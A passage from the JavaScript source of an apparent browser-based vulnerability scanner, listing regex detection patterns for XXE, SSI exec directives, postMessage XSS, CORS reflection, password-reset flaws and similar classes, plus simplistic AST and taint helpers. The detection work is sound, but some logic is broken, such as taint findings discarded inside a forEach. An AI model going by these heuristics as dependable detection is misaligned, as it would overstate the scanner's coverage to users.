                    // DOMParser with XML (dangerous)
                    'new\\s+DOMParser\\s*\\(\\s*\\)\\.parseFromString\\s*\\([^)]*text\\/xml',
                    'new\\s+DOMParser\\s*\\(\\s*\\)\\.parseFromString\\s*\\([^)]*(?:req|input|query|params|body)',
                    // XMLHttpRequest receiving XML
                    'XMLHttpRequest[^;]*responseXML',
                    'xhr\\.responseXML\\s*\\|=\\s*[^;]*(?:req|input|query|params|body)',
                    // XML parsing with external entities enabled
                    'xml2js\\.parseString\\s*\\([^)]*(?:req|input|query|params|body)(?!.*explicitArray)',
                    'libxml\\.parseXml\\s*\\([^)]*(?:req|input|query|params|body)',
                    // SOAP/XML endpoint with user input
                    'soap\\s*\\([^)]*(?:req|input|query|params|body)',
                    'xmlparser\\s*\\([^)]*(?:req|input|query|params|body)',
                    // SVG with embedded XML entities
                    '<!ENTITY\\s+\\w+\\s+SYSTEM',
                    '<!DOCTYPE[^>]*\\[\\s*<!ENTITY',
                    // XML upload without validation
                    'upload[^}]*\\.xml',
                    'file\\.mimetype\\s*===\\s*["\'](?:text\\/xml|application\\/xml)["\']'
                ],
                severity: 'HIGH',
                description: 'XXE - XML external entity injection reads files, causes SSRF, or DoS'
            },

            'Insecure Direct File Download': {
                patterns: [
                    // res.sendFile with user input
                    'sendFile\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'send\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)[^)]*(?:path|file|download)',
                    // res.download with user input
                    'download\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // createReadStream with user input
                    'createReadStream\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // fs.readFile with user input (no path traversal check)
                    'readFile\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)(?!.*(?:path\\.resolve|path\\.join|\\.\\.))',
                    // Express static file serving with user-controlled path
                    'express\\.static\\s*\\([^)]*(?:req|input|query|params|body)',
                    // File download endpoint without path validation
                    'Content-Disposition\\s*:\\s*attachment[^}]*filename\\s*=\\s*[^;]*(?:req|input|query|params|body)',
                    // Stream file to response with user path
                    'pipe\\s*\\(\\s*res\\s*\\)(?!.*(?:whitelist|allowlist|validate|sanitiz))'
                ],
                severity: 'HIGH',
                description: 'Insecure file download - user-controlled path allows arbitrary file read'
            },

            'PostMessage XSS': {
                patterns: [
                    // Message handler without origin check
                    'addEventListener\\s*\\(\\s*["\']message["\']\\s*,\\s*(?:function|\\(e|\\(event)\\s*\\{[^}]*(?:eval|Function|innerHTML|document\\.write|\\.html\\()',
                    'onmessage\\s*=\\s*(?:function|\\(e|\\(event)\\s*\\{[^}]*(?:eval|Function|innerHTML|document\\.write)',
                    // postMessage with wildcard origin
                    'postMessage\\s*\\([^)]*,\\s*["\']\\*["\']\\s*\\)',
                    // Event data used in dangerous sinks without validation
                    '(?:event|e|msg|message)\\.data[^;]*(?:innerHTML|outerHTML|eval|Function|document\\.write|location)',
                    // postMessage listener with eval
                    'addEventListener\\s*\\(\\s*["\']message["\']\\s*,\\s*[^)]*\\)\\s*\\{[^}]*eval\\s*\\(',
                    // JSON.parse of event data into dangerous sink
                    '(?:event|e|msg|message)\\.data[^;]*JSON\\.parse[^;]*(?:innerHTML|eval|document\\.write)',
                    // window.parent postMessage without origin
                    'window\\.parent\\.postMessage\\s*\\([^)]*,\\s*["\']\\*["\']\\s*\\)',
                    'parent\\.postMessage\\s*\\([^)]*,\\s*["\']\\*["\']\\s*\\)'
                ],
                severity: 'HIGH',
                description: 'PostMessage XSS - message handler without origin check allows cross-origin script execution'
            },

            'Timing Side-Channel': {
                patterns: [
                    // Non-constant-time string comparison for secrets
                    'for\\s*\\(\\s*(?:let|var|const)\\s+\\w+\\s*=\\s*0\\s*;\\s*\\w+\\s*<\\s*(?:token|secret|key|password|hash|otp|pin)\\.length',
                    'while\\s*\\(\\s*(?:token|secret|key|password|hash|otp|pin)\\[',
                    // String comparison of secrets with early return
                    '(?:token|secret|key|password|hash|otp|pin)\\[\\s*\\w+\\s*\\]\\s*!==?\\s*[^}]*return\\s+(?:false|null|undefined|new\\s+Error)',
                    // Character-by-character comparison
                    'charAt\\s*\\(\\s*\\w+\\s*\\)\\s*!==?\\s*[^}]*(?:return|throw)',
                    // Hash comparison without constant-time
                    'crypto\\.timingSafeEqual\\s*\\(\\s*[^)]*(?!.*\\.length)',
                    // Login timing (response time leaks valid username)
                    '(?:username|email|user)\\s*(?:===|==|\\.match|\\.test|\\.compare)[^}]*\\{[^}]*(?:await|async|\\.then)[^}]*(?:password|hash)',
                    // OTP/token comparison
                    '(?:otp|token|code|pin)\\s*(?:===|==|!==?)[^}]*res\\.(?:send|json|status)',
                    // bcrypt.compare outside try-catch (leaks timing)
                    'bcrypt\\.compare\\s*\\([^)]*\\)\\s*\\.then\\s*\\([^}]*res\\.\\s*(?:send|json|status)'
                ],
                severity: 'MEDIUM',
                description: 'Timing side-channel - non-constant-time comparison leaks secrets via response time'
            },

            // ═══════════════════════════════════════════════════════════
            // 🆕 BATCH 3: BUSINESS LOGIC / DoS (5 classes)
            // ═══════════════════════════════════════════════════════════

            'Business Logic Flaws': {
                patterns: [
                    // Negative quantity/price manipulation
                    '(?:quantity|qty|amount|price|count|stock|balance)\\s*[=+\\-*/%]+\\s*[^;]*(?!.*(?:Math\\.abs|Math\\.max|>=\\s*0|>\\s*0|parseInt|Number\\.isInteger|parseFloat))',
                    // Price/total calculation without validation
                    '(?:total|price|amount|cost|subtotal)\\s*=\\s*[^;]*(?:req\\.(?:query|body|params)|input|query|params|body)(?!.*(?:Math\\.abs|>=|clamp|limit|min\\())',
                    // Coupon/discount without usage limit check
                    '(?:coupon|discount|promo|voucher|redeem)[^}]*(?:count|usage|limit|remaining)(?!.*(?:update|decrement|atom))',
                    // Integer overflow in balance
                    '(?:balance|credit|points|score|wallet)\\s*(?:\\+=|\\-=)\\s*[^;]*(?!.*(?:Number\\.isSafeInteger|<=\\s*Number\\.MAX_SAFE_INTEGER))',
                    // Race on inventory/stock
                    '(?:stock|inventory|quantity|count)\\s*(?:\\-=)\\s*[^;]*(?!.*(?:atomic|transaction|lock|mutex|compare))',
                    // Free items via negative price
                    '(?:price|amount|total|cost)\\s*(?:<\\s*0|<=\\s*0|===?\\s*-\\d)',
                    // Cart manipulation
                    'cart\\.\\w+\\s*(?:=|push|splice)\\s*[^;]*(?:req\\.(?:body|query|params)|input|query|params|body)(?!.*(?:validate|sanitize|filter|whitelist))'
                ],
                severity: 'HIGH',
                description: 'Business logic flaw - price/quantity manipulation, negative values, race on inventory'
            },

            'ReDoS (Regex Denial of Service)': {
                patterns: [
                    // Catastrophic backtracking patterns
                    '(?:\\([^)]*\\+\\)\\+|(?:\\+|\\*)\\)\\*)',
                    '\\(\\[\\^\\]\\]\\*\\)\\+',
                    '(?:a\\+)+\\$',
                    '(?:x+)+\\s*[=:]',
                    // User-supplied regex without timeout
                    'new\\s+RegExp\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)(?!.*timeout)',
                    // Regex from user input
                    'RegExp\\s*\\(\\s*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // Dangerous regex in validation
                    '(?:validate|check|verify|test|match|replace)\\s*\\([^)]*new\\s+RegExp[^)]*(?:req|input|query|params|body)',
                    // Nested quantifiers in static regex (server hanging)
                    '(?:\\.\\*\\.\\*){3,}',
                    '\\(\\.\\+\\)\\+',
                    '\\(\\[a-zA-Z\\]\\+\\)\\+\\$',
                    // Regex without backtracking protection
                    '\\.replace\\s*\\(\\s*new\\s+RegExp\\s*\\([^)]*(?:req|input|query|params|body)(?!.*(?:timeout|matchAll|y\\s*flag))'
                ],
                severity: 'MEDIUM',
                description: 'ReDoS - catastrophic backtracking in regex causes server hang on crafted input'
            },

            'HTTP Header Injection': {
                patterns: [
                    // User input in response headers
                    'res\\.setHeader\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'res\\.set\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'res\\.header\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // Location header with user input
                    'res\\.setHeader\\s*\\(\\s*["\']Location["\']\\s*,\\s*[^)]*(?:req|input|query|params|body)',
                    'res\\.redirect\\s*\\(\\s*3\\d\\d\\s*,\\s*[^)]*(?:req|input|query|params|body)',
                    // Set-Cookie with user input
                    'res\\.setHeader\\s*\\(\\s*["\']Set-Cookie["\']\\s*,\\s*[^)]*(?:req|input|query|params|body)',
                    'res\\.cookie\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // CRLF in header value
                    '(?:req|input|query|params|body)[^;]*\\r\\n',
                    '\\\\r\\\\n[^;]*(?:req|input|query|params|body)',
                    // Content-Type with user input
                    'res\\.setHeader\\s*\\(\\s*["\']Content-Type["\']\\s*,\\s*[^)]*(?:req|input|query|params|body)',
                    // X-Powered-By / Server header injection
                    'res\\.setHeader\\s*\\(\\s*["\'](?:X-Powered-By|Server)["\']\\s*,\\s*[^)]*(?:req|input|query|params|body)'
                ],
                severity: 'HIGH',
                description: 'HTTP header injection - CRLF in headers enables XSS, cache poisoning, or response splitting'
            },

            'CORS Origin Reflection': {
                patterns: [
                    // Server reflects Origin in ACAO header
                    'Access-Control-Allow-Origin\\s*:\\s*(?:req\\.(?:headers\\.origin|query\\.origin)|origin)',
                    'res\\.setHeader\\s*\\(\\s*["\']Access-Control-Allow-Origin["\']\\s*,\\s*[^)]*(?:req|origin|input)',
                    // Wildcard with credentials (most dangerous)
                    'Access-Control-Allow-Origin\\s*:\\s*\\*[\\s\\S]*Access-Control-Allow-Credentials\\s*:\\s*true',
                    'Access-Control-Allow-Credentials\\s*:\\s*true[\\s\\S]*Access-Control-Allow-Origin\\s*:\\s*\\*',
                    // No origin validation
                    'app\\.use\\s*\\(\\s*cors\\s*\\(\\s*\\)\\s*\\)',
                    // Origin reflected without whitelist check
                    '(?:origin|req\\.headers\\.origin)\\s*&&\\s*res\\.setHeader',
                    'if\\s*\\(\\s*origin\\s*\\)\\s*\\{[^}]*setHeader[^}]*["\']Access-Control-Allow-Origin["\']',
                    // CORS with any subdomain allowed
                    'origin\\s*:\\s*\\/\\^[\\^)]*\\$/',
                    'origin\\s*:\\s*(?:req|origin)\\.replace'
                ],
                severity: 'MEDIUM',
                description: 'CORS origin reflection - server reflects any Origin, allowing credential theft from any site'
            },

            'Password Reset Flaws': {
                patterns: [
                    // Host header injection in reset link
                    '(?:host|Host)\\s*:\\s*[^;]*(?:req\\.headers\\.host|req\\.get\\s*\\(\\s*["\']host["\'])',
                    'resetUrl\\s*[:=]\\s*[^;]*req\\.headers\\.host',
                    'resetLink\\s*[:=]\\s*[^;]*req\\.headers\\.host',
                    // Predictable reset token
                    'resetToken\\s*[:=]\\s*(?:Math\\.random|Date\\.now|new\\s+Date)',
                    'token\\s*[:=]\\s*(?:Math\\.random|Date\\.now)(?!.*crypto)',
                    // Token not invalidated after use
                    'resetToken\\s*[:=]\\s*null(?!.*(?:\\.save|update|delete))',
                    // Missing rate limit on reset
                    'resetPassword\\s*\\(\\s*\\)(?!.*(?:rate|limit|throttle|attempt))',
                    // Token in URL (leaks in referrer/logs)
                    '(?:reset|forgot)\\s*(?:Token|Code|Link)\\s*[:=]\\s*["\'][^"\']*(?:\\?|&)(?:token|code|reset)=',
                    // User enumeration via reset
                    '(?:user|account)\\.findOne\\s*\\(\\s*\\{[^}]*email\\s*:\\s*req[^}]*\\}\\s*\\)\\.then\\s*\\(\\s*(?:user|account)\\s*=>\\s*\\{[^}]*!user[^}]*res\\.(?:send|json|status)',
                    // Weak reset token entropy
                    'resetToken\\s*[:=]\\s*(?:Math\\.floor\\s*\\(\\s*Math\\.random|crypto\\.randomBytes\\s*\\(\\s*[1-4]\\s*\\))'
                ],
                severity: 'CRITICAL',
                description: 'Password reset flaw - host header injection, predictable token, user enumeration'
            },

            // ═══════════════════════════════════════════════════════════
            // 🆕 BATCH 4: SUPPLY CHAIN / INFRASTRUCTURE (5 classes)
            // ═══════════════════════════════════════════════════════════

            'Server-Side Include (SSI) Injection': {
                patterns: [
                    // SSI directives in user input
                    '<!--#\\s*(?:exec|include|echo|config|fsize|flastmod|date)\\s+',
                    '<!--#exec\\s+cmd\\s*=',
                    '<!--#exec\\s+cgi\\s*=',
                    '<!--#include\\s+(?:virtual|file)\\s*=',
                    '<!--#echo\\s+var\\s*=',
                    // SSI in response with user input
                    'res\\.send\\s*\\([^)]*(?:<!--#|<%|<\\?php)[^)]*(?:req|input|query|params|body)',
                    'res\\.write\\s*\\([^)]*(?:<!--#)(?:req|input|query|params|body)',
                    // Template engine with SSI-like features
                    'template\\s*\\(\\s*["\'][^"\']*(?:<!--#|SSI)',
                    // User input rendered as HTML with SSI
                    '(?:innerHTML|outerHTML|document\\.write)\\s*[^;]*(?:req|input|query|params|body)(?!.*(?:encode|escape|sanitiz))',
                    // Server config enabling SSI
                    'ssi\\s*:\\s*(?:true|1|enabled)',
                    'Options\\s+\\+?Includes'
                ],
                severity: 'CRITICAL',
                description: 'SSI injection - user input in server-side includes enables RCE'
            },

            'Memory Safety (Buffer Overflow)': {
                patterns: [
                    // Buffer operations without bounds check
                    'buffer\\.write\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)(?!.*(?:length|offset|byteLength))',
                    'buffer\\.copy\\s*\\([^)]*(?:req|input|query|params|body)(?!.*(?:length|targetStart|sourceStart))',
                    // Alloc without size validation
                    'Buffer\\.alloc\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    'Buffer\\.allocUnsafe\\s*\\([^)]*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // Buffer.from with user-controlled encoding
                    'Buffer\\.from\\s*\\([^)]*(?:req|input|query|params|body)\\s*,\\s*["\'](?:hex|base64|binary|latin1)["\']',
                    // Native addon buffer operations
                    'node-addon-api[^}]*Buffer[^}]*(?:req|input|query|params|body)',
                    'napi_create_buffer[^}]*(?:req|input|query|params|body)',
                    // Unchecked length from user
                    '(?:length|size|bytes|offset|index)\\s*[:=]\\s*(?:parseInt|Number)\\s*\\(\\s*(?:req\\.(?:query|body|params)|input|query|params|body)',
                    // Buffer truncation issues
                    'buffer\\.slice\\s*\\([^)]*(?:req|input|query|params|body)',
                    'buffer\\.subarray\\s*\\([^)]*(?:req|input|query|params|body)'
                ],
                severity: 'HIGH',
                description: 'Memory safety - buffer operations without bounds checking may cause overflow or DoS'
            },

            'Log Injection': {
                patterns: [
                    // User input in log without sanitization
                    '(?:console|logger|log)\\.(?:log|info|warn|error|debug)\\s*\\([^)]*(?:req\\.(?:query|body|params|headers)|input|query|params|body)(?!.*(?:encode|escape|sanitiz|replace))',
                    // Log template injection
                    '(?:console|logger|log)\\.(?:log|info|warn|error|debug)\\s*\\(\\s*`[^`]*\\$\\{[^}]*(?:req|input|query|params|body)',
                    // Log with user-controlled level
                    '(?:console|logger|log)\\[\\s*(?:req|input|query|params|body)\\s*\\]',
                    // Winston/pino/morgan with user input
                    '(?:winston|pino|bunyan|morgan)\\.[^;]*(?:req\\.(?:query|body|params|headers)|input|query|params|body)',
                    // User input in audit log
                    'audit\\.log\\s*\\([^)]*(?:req|input|query|params|body)(?!.*(?:sanitiz|escape|validat))',
                    // Log forge via newline injection
                    '(?:req|input|query|params|body)[^;]*(?:\\\\n|\\\\r|%0a|%0d|\\n|\\r)',
                    // Logger with user-controlled meta
                    'logger\\.(?:info|warn|error)\\s*\\([^)]*(?:message|meta|data)\\s*:\\s*(?:req|input|query|params|body)'
                ],
                severity: 'MEDIUM',
                description: 'Log injection - user input in logs without sanitization enables log forge, XSS, or injection'
            },

            'Client-Side Redirect Manipulation': {
                patterns: [
                    // URL parameter controls redirect destination
                    '(?:window\\.location|location\\.href|location\\.replace)\\s*[=]\\s*[^;]*(?:decodeURIComponent|decodeURI)\\s*\\(\\s*[^)]*(?:req|input|query|params|hash|search)',
                    // Redirect from URL params without validation
                    'window\\.location\\s*=\\s*[^;]*(?:URLSearchParams|location\\.search|location\\.hash)',
                    'window\\.location\\.href\\s*=\\s*[^;]*(?:URLSearchParams|location\\.search|location\\.hash)',
                    // Next/router redirect from query
                    '(?:router\\.push|router\\.replace|navigate)\\s*\\([^)]*(?:query|search|hash|params|URLSearchParams)',
                    // React Router redirect from URL
                    '<Redirect\\s+to\\s*=\\s*\\{[^}]*(?:location\\.search|location\\.hash|URLSearchParams)',
                    // Hidden redirect in meta tag
                    '(?:document\\.createElement|innerHTML)\\s*[^;]*(?:meta)[^;]*(?:refresh|location)(?!.*(?:escape|sanitiz|validat))',
                    // form action from URL param
                    'form\\.action\\s*=\\s*[^;]*(?:req|input|query|params|URLSearchParams)',
                    // window.open with URL param
                    'window\\.open\\s*\\([^)]*(?:req|input|query|params|URLSearchParams)(?!.*(?:whitelist|allowlist|validat))'
                ],
                severity: 'MEDIUM',
                description: 'Client-side redirect manipulation - URL params control redirect destination without validation'
            },

            'Subresource Integrity (SRI) Bypass': {
                patterns: [
                    // Dynamic script creation without integrity
                    'createElement\\s*\\(\\s*["\']script["\']\\s*\\)[^;]*\\.src\\s*=(?!.*integrity)',
                    // External script loaded without SRI
                    'document\\.createElement\\s*\\(\\s*["\']script["\']\\s*\\)[^;]*crossOrigin',
                    // Dynamic link/css without integrity
                    'createElement\\s*\\(\\s*["\']link["\']\\s*\\)[^;]*\\.href\\s*=(?!.*integrity)',
                    // Script injection without SRI verification
                    'new\\s+Script\\s*\\([^)]*(?:req|input|query|params|body)(?!.*integrity)',
                    // CDN script without integrity check
                    '<script[^>]*src\\s*=\\s*["\']https?://[^"\']*cdn[^"\']*["\'](?![^>]*integrity)',
                    // Dynamic import without integrity
                    'import\\s*\\([^)]*(?:req|input|query|params|body)(?!.*integrity)',
                    // postMessage script load without verification
                    'addEventListener\\s*\\(\\s*["\']message["\']\\s*[^)]*\\)[^}]*createElement\\s*\\(\\s*["\']script["\']\\s*\\)(?!.*integrity)',
                    // fetch + eval without integrity
                    'fetch\\s*\\([^)]*\\)[^}]*\\.then[^}]*eval\\s*\\('
                ],
                severity: 'MEDIUM',
                description: 'SRI bypass - dynamic script loading without integrity attribute enables supply chain attacks'
            }
        };

        this.results = {};
        this.scripts = [];

        // Initialize advanced analysis components
        this.initializeAdvancedAnalysis();
    }

    // 🚀 INITIALIZE ADVANCED ANALYSIS COMPONENTS
    initializeAdvancedAnalysis() {
        if (this.enableAST) {
            this.initializeASTParser();
        }
        if (this.enableTaint) {
            this.initializeTaintEngine();
        }
        this.initializeSemanticAnalyzer();
        this.initializeConfidenceScorer();
    }

    // 🌳 AST PARSER INITIALIZATION
    initializeASTParser() {
        try {
            // Lightweight AST parser for browser environment
            this.astParser = {
                parse: (code) => this.parseJavaScriptAST(code),
                traverse: (ast, visitor) => this.traverseAST(ast, visitor),
                findVulnerablePatterns: (ast) => this.findVulnerablePatternsInAST(ast)
            };
        } catch (error) {
            console.warn('AST Parser initialization failed:', error);
            this.enableAST = false;
        }
    }

    // 🧪 TAINT ANALYSIS ENGINE
    initializeTaintEngine() {
        this.taintEngine = {
            sources: this.getTaintSources(),
            sinks: this.getTaintSinks(),
            sanitizers: this.getTaintSanitizers(),
            analyze: (ast, scriptContent) => this.performTaintAnalysis(ast, scriptContent)
        };
    }

    // 🧠 SEMANTIC ANALYZER
    initializeSemanticAnalyzer() {
        this.semanticAnalyzer = {
            recognizeSanitization: (code, line) => this.recognizeSanitizationFunctions(code, line),
            identifyTrustedSources: (code, line) => this.identifyTrustedDataSources(code, line),
            assessExploitability: (finding) => this.assessExploitability(finding)
        };
    }

    // 📊 CONFIDENCE SCORING SYSTEM
    initializeConfidenceScorer() {
        this.confidenceScorer = {
            calculateScore: (finding) => this.calculateConfidenceScore(finding),
            getSeverityLevel: (score) => this.getSeverityFromScore(score),
            prioritizeFindings: (findings) => this.prioritizeFindings(findings)
        };
    }

    // 📝 SMART LOGGING - Respects quiet mode
    log(message, level = 'info') {
        if (this.quiet && level === 'info') return;
        if (level === 'error' || level === 'warn') {
            console[level](message);
        } else {
            console.log(message);
        }
    }

    // ️ VALIDATE MATCH TO REDUCE FALSE POSITIVES (cached regex)
    validateMatch(line, pattern) {
        let cached = this._compiledPatternCache.get(pattern);
        if (!cached) {
            cached = new RegExp(pattern, 'gi');
            this._compiledPatternCache.set(pattern, cached);
        }
        cached.lastIndex = 0;
        const match = cached.exec(line);
        if (!match) return false;

        const matchIndex = match.index;

        const commentIndex = line.indexOf('//');
        if (commentIndex !== -1 && matchIndex > commentIndex) return false;

        const blockStart = line.indexOf('/*');
        if (blockStart !== -1 && matchIndex > blockStart) return false;

        const beforeMatch = line.substring(0, matchIndex);
        const quoteCount = (beforeMatch.match(/["']/g) || []).length;
        if (quoteCount % 2 !== 0) return false;

        return true;
    }

    // 🌳 AST PARSING METHODS FOR ADVANCED ANALYSIS
    parseJavaScriptAST(code) {
        try {
            // Simple AST parser for browser environment
            const ast = this.buildSimpleAST(code);
            return ast;
        } catch (error) {
            console.warn('AST parsing failed:', error);
            return null;
        }
    }

    buildSimpleAST(code) {
        // Basic AST builder for vulnerability detection
        const lines = code.split('\n');
        const ast = {
            type: 'Program',
            body: [],
            sourceType: 'script'
        };

        lines.forEach((line, index) => {
            const node = this.parseLineToASTNode(line.trim(), index + 1);
            if (node) {
                ast.body.push(node);
            }
        });

        return ast;
    }

    parseLineToASTNode(line, lineNumber) {
        // Basic node parsing for vulnerability patterns
        if (line.includes('eval(')) {
            return {
                type: 'CallExpression',
                callee: { type: 'Identifier', name: 'eval' },
                arguments: [{ type: 'Literal', value: 'DYNAMIC_CODE' }],
                loc: { start: { line: lineNumber } }
            };
        }

        if (line.includes('innerHTML') || line.includes('outerHTML')) {
            return {
                type: 'AssignmentExpression',
                left: { type: 'MemberExpression', property: { name: 'innerHTML' } },
                right: { type: 'Literal', value: 'USER_INPUT' },
                loc: { start: { line: lineNumber } }
            };
        }

        if (line.includes('require(')) {
            return {
                type: 'CallExpression',
                callee: { type: 'Identifier', name: 'require' },
                arguments: [{ type: 'Literal', value: 'MODULE' }],
                loc: { start: { line: lineNumber } }
            };
        }

        return null;
    }

    traverseAST(ast, visitor) {
        if (!ast || !visitor) return;

        // Simple traversal for our AST structure
        if (ast.body && Array.isArray(ast.body)) {
            ast.body.forEach(node => {
                this.visitNode(node, visitor);
            });
        }
    }

    visitNode(node, visitor) {
        if (!node) return;

        // Call visitor for this node
        if (visitor[node.type]) {
            visitor[node.type](node);
        }

        // Traverse child nodes
        Object.keys(node).forEach(key => {
            const child = node[key];
            if (Array.isArray(child)) {
                child.forEach(item => {
                    if (typeof item === 'object' && item.type) {
                        this.visitNode(item, visitor);
                    }
                });
            } else if (typeof child === 'object' && child && child.type) {
                this.visitNode(child, visitor);
            }
        });
    }

    findVulnerablePatternsInAST(ast) {
        const vulnerabilities = [];

        const visitor = {
            CallExpression: (node) => {
                if (node.callee && node.callee.name === 'eval') {
                    vulnerabilities.push({
                        type: 'CodeExecution',
                        location: node.loc,
                        pattern: 'eval()',
                        confidence: 0.9
                    });
                }
                if (node.callee && node.callee.name === 'require') {
                    vulnerabilities.push({
                        type: 'PathTraversal',
                        location: node.loc,
                        pattern: 'require()',
                        confidence: 0.7
                    });
                }
            },
            AssignmentExpression: (node) => {
                if (node.left && node.left.property && node.left.property.name === 'innerHTML') {
                    vulnerabilities.push({
                        type: 'DOMXSS',
                        location: node.loc,
                        pattern: 'innerHTML assignment',
                        confidence: 0.8
                    });
                }
            }
        };

        this.traverseAST(ast, visitor);
        return vulnerabilities;
    }

    // 🧪 TAINT ANALYSIS METHODS
    getTaintSources() {
        return [
            'location.hash', 'location.search', 'location.href',
            'document.cookie', 'localStorage', 'sessionStorage',
            'window.name', 'req.params', 'req.query', 'req.body',
            'req.headers', 'process.argv', 'process.env'
        ];
    }

    getTaintSinks() {
        return [
            'eval', 'Function', 'setTimeout', 'setInterval',
            'innerHTML', 'outerHTML', 'document.write',
            'insertAdjacentHTML', 'element.src', 'element.href',
            'require', 'fs.readFile', 'child_process.exec'
        ];
    }

    getTaintSanitizers() {
        return [
            'encodeURIComponent', 'encodeURI', 'escape',
            'DOMPurify.sanitize', 'validator.escape',
            'sanitize-html', 'xss-filters'
        ];
    }

    performTaintAnalysis(ast, scriptContent) {
        const sources = this.getTaintSources();
        const sinks = this.getTaintSinks();
        const sanitizers = this.getTaintSanitizers();

        const taintedVars = new Set();
        const sanitizedVars = new Set();

        // Simple taint tracking
        const lines = scriptContent.split('\n');

        lines.forEach((line, index) => {
            // Track sources
            sources.forEach(source => {
                if (line.includes(source)) {
                    const varMatch = line.match(/(\w+)\s*=\s*.*(?:location|document|req|process)/);
                    if (varMatch) {
                        taintedVars.add(varMatch[1]);
                    }
                }
            });

            // Track sanitizers
            sanitizers.forEach(sanitizer => {
                if (line.includes(sanitizer)) {
                    const varMatch = line.match(/(\w+)\s*=\s*.*(?:encode|escape|sanitize)/);
                    if (varMatch) {
                        sanitizedVars.add(varMatch[1]);
                    }
                }
            });

            // Check for tainted data in sinks
            sinks.forEach(sink => {
                if (line.includes(sink)) {
                    taintedVars.forEach(taintedVar => {
                        if (line.includes(taintedVar) && !sanitizedVars.has(taintedVar)) {
                            return {
                                type: 'TaintFlow',
                                sink: sink,
                                taintedVar: taintedVar,
                                line: index + 1,
                                confidence: 0.85
                            };
                        }
                    });
                }
            });
        });

        return { taintedVars: Array.from(taintedVars), sanitizedVars: Array.from(sanitizedVars) };
    }

    // 🧠 SEMANTIC ANALYSIS METHODS
    recognizeSanitizationFunctions(code, line) {
        const sanitizationPatterns = [
            /encodeURIComponent\(/,
            /encodeURI\(/,
            /escape\(/,
            /DOMPurify\.sanitize/,
            /validator\.escape/,
            /sanitize-html/,
            /xss-filters/,
            /\.replace\(.*[<>"'].*[<>"']\)/,
            /\.trim\(\)/,
            /parseInt\(/,
            /parseFloat\(/,
            /Number\(/,
            /Boolean\(/,
            /String\(/,
            /JSON\.parse\(/,
            /decodeURIComponent\(/,
            /decodeURI\(/,
            /unescape\(/,
            /atob\(/,
            /btoa\(/,
            /Buffer\.from\(/,
            /new\s+URL\(/,
            /new\s+URLSearchParams\(/,
            /querystring\.parse/,
            /qs\.parse/
        ];

        return sanitizationPatterns.some(pattern => pattern.test(code));
    }

    identifyTrustedDataSources(code, line) {
        const trustedSources = [
            /const\s+\w+\s*=\s*["'][^"']*["']/,
            /let\s+\w+\s*=\s*["'][^"']*["']/,
            /var\s+\w+\s*=\s*["'][^"']*["']/,
            /\w+\s*=\s*\d+/,
            /\w+\s*=\s*true/,
            /\w+\s*=\s*false/,
            /\w+\s*=\s*null/,
            /\w+\s*=\s*undefined/,
            /\w+\s*=\s*\[\]/,
            /\w+\s*=\s*\{\}/,
            /process\.env\.\w+/,
            /config\.\w+/,
            /settings\.\w+/,
            /constants\.\w+/
        ];

        return trustedSources.some(pattern => pattern.test(code));
    }

    assessExploitability(finding) {
        let score = 0.5; // Base score

        // Increase score based on severity
        if (finding.severity === 'CRITICAL') score += 0.3;
        else if (finding.severity === 'HIGH') score += 0.2;
        else if (finding.severity === 'MEDIUM') score += 0.1;

        // Increase score if user input is involved
        if (finding.code && (finding.code.includes('location') || finding.code.includes('req.') ||
            finding.code.includes('document.cookie') || finding.code.includes('localStorage'))) {
            score += 0.2;
        }

        // Decrease score if sanitization is present
        if (finding.code && this.recognizeSanitizationFunctions(finding.code, finding.line)) {
            score -= 0.3;
        }

        // Decrease score if it's in a trusted context
        if (finding.code && this.identifyTrustedDataSources(finding.code, finding.line)) {
            score -= 0.2;
        }

        return Math.max(0, Math.min(1, score));
    }

    // 📊 CONFIDENCE SCORING METHODS
    calculateConfidenceScore(finding) {
        let score = 0.5; // Base confidence

        // Pattern specificity
        if (finding.pattern_matched) {
            const patterns = Array.isArray(finding.pattern_matched) ? finding.pattern_matched : [finding.pattern_matched];
            patterns.forEach(pattern => {
                if (pattern.includes('\\b') || pattern.includes('^') || pattern.includes('$')) {
                    score += 0.1; // Specific patterns get higher confidence
                }
                if (pattern.includes('eval') || pattern.includes('innerHTML') || pattern.includes('require')) {
                    score += 0.15; // Known dangerous patterns
                }
            });
        }

        // Context analysis
        if (finding.code) {
            // Lower confidence for comments or documentation
            if (finding.code.includes('//') || finding.code.includes('/*') || finding.code.includes('*')) {
                score -= 0.2;
            }

            // Higher confidence for actual function calls
            if (finding.code.includes('(') && finding.code.includes(')')) {
                score += 0.1;
            }

            // Lower confidence for variable declarations
            if (finding.code.includes('var ') || finding.code.includes('let ') || finding.code.includes('const ')) {
                score -= 0.1;
            }
        }

        // Source reliability
        if (finding.source) {
            if (finding.source.includes('inline') || finding.source.includes('external')) {
                score += 0.05; // External sources are more reliable
            }
        }

        return Math.max(0, Math.min(1, score));
    }

    getSeverityFromScore(score) {
        if (score >= 0.8) return 'CRITICAL';
        if (score >= 0.6) return 'HIGH';
        if (score >= 0.4) return 'MEDIUM';
        return 'LOW';
    }

    prioritizeFindings(findings) {
        return findings
            .map(finding => ({
                ...finding,
                confidence: this.calculateConfidenceScore(finding),
                exploitability: this.assessExploitability(finding)
            }))
            .sort((a, b) => {
                // Sort by combined score (confidence + exploitability)
                const scoreA = (a.confidence + a.exploitability) / 2;
                const scoreB = (b.confidence + b.exploitability) / 2;
                return scoreB - scoreA;
            });
    }

    // 📚 COLLECT ALL JAVASCRIPT - ADVANCED FETCHING WITH CORS BYPASS
    async collectAllScripts() {
        const scripts = Array.from(document.scripts);
        const collected = [];

        // Collect inline scripts immediately (fastest)
        scripts.forEach((script, index) => {
            if (script.textContent && script.textContent.trim()) {
                const content = script.textContent;
